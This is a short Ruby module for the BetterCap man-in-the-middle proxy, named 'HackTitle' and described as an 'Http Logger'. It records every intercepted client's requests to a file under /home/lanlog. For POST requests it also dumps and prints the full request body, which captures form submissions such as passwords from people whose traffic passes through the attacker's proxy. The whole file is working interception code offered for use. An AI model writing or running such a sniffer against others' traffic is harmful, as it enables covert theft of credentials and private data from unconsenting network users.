
class HackTitle < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'Http Logger',
    'Description' => 'Logs http requests to a specific file',
    'Version'     => '1.0.0',
    'Author'      => "Mocky",
    'License'     => 'GPL3'
  )
  
  # called before the request is performed
  def on_pre_request( request )
    log_to_file "#{request.client.to_s} #{request.method.to_s} #{request.to_url(256).to_s}\n"
    if request.post?
      begin
        log_to_file "------------------ Logging POST for URL: "+request.to_url(256)+"---------------------\n",true
        log_to_file request.to_s+"\n",true
      rescue => ex
        print "Error on reading POST request\n"
      end
    end
  end

  # this method is called after the request is performed
  def on_request( request, response )
    # is it a html page?
    # if response.content_type =~ /^text\/html.*/
    #end
  end
  def log_to_file(content,output=false)
    f=File.open('/home/lanlog/log/out.txt','a')
    f.puts content
    f.flush
    f.close
    if output
       print content
    end
  end 
end
